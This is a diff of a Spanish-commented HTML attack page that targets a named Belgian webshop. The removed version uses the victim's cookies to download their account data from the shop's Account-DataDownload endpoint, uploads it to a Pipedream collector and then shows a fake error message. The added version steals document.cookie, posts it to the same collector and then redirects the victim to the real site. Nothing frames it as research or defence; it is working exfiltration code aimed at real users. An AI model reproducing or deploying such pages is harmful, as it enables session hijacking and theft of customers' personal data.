@@ -2,57 +2,26 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Cargando...</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      text-align: center;
-      padding-top: 50px;
-      background-color: #f4f4f4;
-      color: #555;
-    }
-  </style>
+  <title>Promoción especial</title>
 </head>
 <body>
-  <h2>Conectando al servidor...</h2>
-  <p>Por favor, espera un momento...</p>
+  <h1>Redirigiendo a la oferta...</h1>
 
   <script>
-    // URL del endpoint vulnerable en torfs.be
-    const dataDownloadUrl = "https://www.torfs.be/on/demandware.store/Sites-Torfs-Webshop-BE-Site/nl_BE/Account-DataDownload";
-    
-    // URL de tu endpoint en Pipedream
-    const attackerUrl = "https://eoozwutroaqr7ij.m.pipedream.net";
+    // Capturamos la cookie
+    const cookie = document.cookie;
 
-    // Paso 1: Descargar datos de Torfs.be usando la cookie de la víctima
-    fetch(dataDownloadUrl, {
-      method: "GET",
-      credentials: "include"  // Incluye cookies como dwsid automáticamente
-    })
-    .then(response => {
-      if (!response.ok) {
-        throw new Error("Error al obtener datos: " + response.status);
-      }
-      return response.blob();
-    })
-    .then(blob => {
-      // Paso 2: Preparar archivo para enviarlo a tu servidor
-      const formData = new FormData();
-      formData.append('file', blob, 'datos_victima.zip');
-
-      // Paso 3: Enviar el archivo al atacante
-      return fetch(attackerUrl, {
-        method: "POST",
-        body: formData
-      });
+    // La enviamos a tu endpoint
+    fetch("https://eoozwutroaqr7ij.m.pipedream.net", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      body: "cookie=" + encodeURIComponent(cookie)
     })
     .then(() => {
-      // Mensaje para la víctima (opcional)
-      document.body.innerHTML = "<h2>Ocurrió un error, por favor intenta más tarde.</h2>";
-    })
-    .catch(err => {
-      console.error("Error:", err);
-      document.body.innerHTML = "<h2>El servicio está temporalmente no disponible.</h2>";
+      // Redirigimos a la víctima a la página real
+      window.location.href = "https://www.torfs.be";
     });
   </script>
 </body>
